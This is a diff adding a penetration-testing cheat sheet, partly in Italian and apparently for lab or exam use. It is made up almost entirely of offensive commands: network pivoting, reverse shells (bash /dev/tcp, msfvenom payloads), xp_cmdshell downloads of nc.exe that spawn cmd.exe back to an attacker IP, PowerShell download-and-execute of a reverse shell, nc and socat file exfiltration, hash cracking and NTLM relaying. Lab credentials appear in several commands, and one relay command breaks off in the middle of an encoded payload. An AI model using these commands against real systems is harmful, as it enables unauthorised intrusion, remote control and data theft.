@@ -1,0 +1,189 @@
+PIVOTING
+
+A) CHISEL:
+
+> chisel server --port 8000 --socks5 --reverse
+> ./chisel client --max-retry-count 1 192.168.119.123:8000 R:1080:socks
+(FYI: change socks5 127.0.0.1 1080 --> chisel on proxychains (NO sudo))
+
+
+B) SSHUTTLE (only 22 open in the edge machine):
+> sshuttle -r sean@IP_EDGE 10.1.1.0/24
+
+
+C) LIGOLO:
+
+Kali:
+
+sudo ip tuntap add user attacker mode tun ligolo
+sudo ip link set ligolo up
+./proxy -selfcert
+
+
+Edge Windows:
+
+.\ligolo-agent.exe -connect 192.168.45.238:11601 -ignore-cert
+
+Kali:
+
+ligolo >> session
+ligolo >> start
+
+sudo ip route add 172.16.200.0/24 dev ligolo (ove 172.16.200.0/24 è la subnet che vuoi analizzare da Kali)
+======================================================================================================================
+PORT SCANNING:
+
+NMAP: sudo nmap -Pn -sC -sV -n -p- --min-rate 1000 --open $IP
+      sudo nmap -Pn -sU -n -sC -sV -p161 $IP
+      
+NC: nc -z -v $IP 1-1000 2>&1 | grep 'open'
+======================================================================================================================
+WEB FUZZING:
+
+FUZZING FILES: wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-large-files.txt --hc 404 "$URL"
+FUZZING DIRECTORIES: wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt --hc 404 "$URL"
+FUZZING: wfuzz -H "Host: FUZZ.mentorquotes.htb" --hc 302,400 -t 50 -c -z file,"/opt/SecLists/Discovery/Web-Content/raft-small-words-lowercase.txt" http://mentorquotes.htb/
+
+GOBUSTER: 
+gobuster dir -u $URL -w /usr/share/wordlists/dirb/common.txt -t 30
+gobuster vhost -u $URL -w /usr/share/seclist/Discovery/DNS/subdomains-top1million-5000.txt --append-domain -t 30
+
+NIKTO: nikto -h $URL
+
+FEROXBUSTER: feroxbuster -u "http://$URL/wp-content/" -C 400,403,500,503,404 --rate-limit 30 -k
+======================================================================================================================
+SMTP
+
+sudo nmap --script smtp-enum-users.nse --script-args smtp-enum-users.methods={VRFY} -p 25 $IP
+smtp-user-enum  -M VRFY -U /usr/share/metasploit-framework/data/wordlists/unix_users.txt -t $IP
+======================================================================================================================
+SMB
+
+sudo nmap -p139,445 --script smb-vuln-*  $IP
+smbclient -L //10.11.1.227 -N
+smbclient //10.11.1.227/dir -N
+
+Get version SMB:
+sudo ngrep -i -d tun0 's.?a.?m.?b.?a.*[[:digit:]]' port 139 (one terminal)
+echo exit | smbclient -L $IP
+======================================================================================================================
+REVERSE SHELL
+
+BASH:
+bash -i >& /dev/tcp/$LOCAL/80 0>&1 (try different port)
+
+EXE:
+msfvenom -p windows/shell/reverse_tcp LHOST=IPAttacker LPORT=80 -f exe > shell.exe
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=IPAttacker LPORT=80 -f exe > shell.exe
+msfvenom -p windows/shell_reverse_tcp LHOST=IPAttacker LPORT=80 -f exe > shell.exe
+msfvenom -p windows/shell_reverse_tcp LHOST=IPAttacker LPORT=80 -f exe > shell.exe
+
+JSP:
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=IPAttacker LPORT=80 -f raw > shell.jsp
+
+ASP:
+msfvenom -p windows/shell/reverse_tcp LHOST=IPAttacker LPORT=80 -f asp > shell.asp
+
+WAR:
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=IPAttacker LPORT=80 -f war > shell.war
+
+PHP:
+msfvenom -p php/reverse_php LHOST=IPAttacker LPORT=80 -f raw > shell.php
+msfvenom -p php/meterpreter/reverse_tcp LHOST=IPAttacker LPORT=80 -f raw -o shell.php
+======================================================================================================================
+Microsoft SQL Server:
+
+proxychains -q python3 /usr/share/doc/python3-impacket/examples/mssqlclient.py sa:CrimsonQuiltScalp193@10.1.1.68
+
+You check xp_cmdshell is enabled. If not you can enable it
+> xp_cmdshell "powershell.exe wget http://IPAttacker/nc.exe -OutFile c:\\Users\Public\\nc.exe"
+> xp_cmdshell  "c:\\Users\Public\\nc.exe -e cmd.exe IPAttacker 4444"
+======================================================================================================================
+SHELLSHOCK
+
+curl -H 'User-Agent: () { :; }; echo "VULNERABLE TO SHELLSHOCK"' http://10.11.1.227/cgi-bin/admin.cgi 2>/dev/null| grep 'VULNERABLE'
+======================================================================================================================
+GCC 
+gcc -m32 -Wl,--hash-style=both -o exe/exploit 9542.c -Wall
+=====================================================================================================================
+Upgrading Simple Shells to Fully Interactive TTYs
+
+python2 -c "import pty; pty.spawn('/bin/bash')"
+python -c "import pty; pty.spawn('/bin/bash')"
+python3 -c "import pty; pty.spawn('/bin/bash')"
+======================================================================================================================
+RDESKTOP/EVIL-WINRM/PSEXEC
+
+rdesktop -u admin -p pass $IPVittima
+evil-winrm -i IPVittima -u admin -p pass
+impacket-psexec user:pass@IPVittima
+pth-winexe -U WORKGROUP/user%pass //IPVittima cmd.exe
+evil-winrm -i 192.168.213.220 -u daveadmin -p "qwertqwertqwert123\!\!"
+======================================================================================================================
+COPY FILE KALI TO WINDOWS
+
+1.
+Certutil.exe on cmd
+- POTATO: certutil.exe -urlcache -f  "http://IPAttacker/potato.exe" potato.exe
+- WINPEAS: certutil.exe -urlcache -f "http://IPAttacker/winPEASany.exe" winpeas.exe 
+
+2.
+SMB: 
+on Windows:
+> net view \\IPAttacker
+> dir \\IPAttacker/START
+> copy \\IPAttacker/START/nc.exe
+
+on Kali:
+impacket-smbserver START .
+
+
+3.
+powershell iex (New-Object Net.WebClient).DownloadString('http://IPAttacker:7000/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.1.1.246 -Port 443
+
+4.
+iwr -uri http://192.168.118.2/winPEASx64.exe -Outfile winPEAS.exe
+======================================================================================================================
+COPY FILE WINDOWS TO KALI
+
+1.Tramite nc. Funziona solo su cmd
+
+Su Kali:
+nc -lvnp 4444 > hash.txt
+
+Su Windows:
+nc.exe -nv IPAttacker 4444 < kerb-Hash0.txt
+
+
+2. Socat
+Kali
+socat TCP4-LISTEN:443,fork file:file.txt
+
+Windows
+socat TCP4:192.168.45.2:443 file:file.txt,create
+======================================================================================================================
+HashCat and JTR
+
+JTR on SSH:
+ssh2john id_rsa > ssh.hash
+john --wordlist=ssh.passwords --rules=sshRules ssh.hash
+
+JTR on Keepass:
+keepass2john db.kdbx > keepass.hash
+hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force
+
+NTLMv2 Crack
+ hashcat -m 5600 ana.hash /usr/share/wordlists/rockyou.txt --force
+ 
+NTLMv2 Relaying
+impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.250.212 -c "powershell.exe -nop -w hidden -enc JABj
+======================================================================================================================
+Altro:
+
+SSH ERROR
+
+ssh john@10.11.1.252 -p 22000 -oKexAlgorithms=+diffie-hellman-group1-sha1 -oHostKeyAlgorithms=+ssh-dss
+
+Worpress Scan plugin
+
+wpscan --url "http://192.168.157.244" --enumerate p --plugins-detection aggressive  
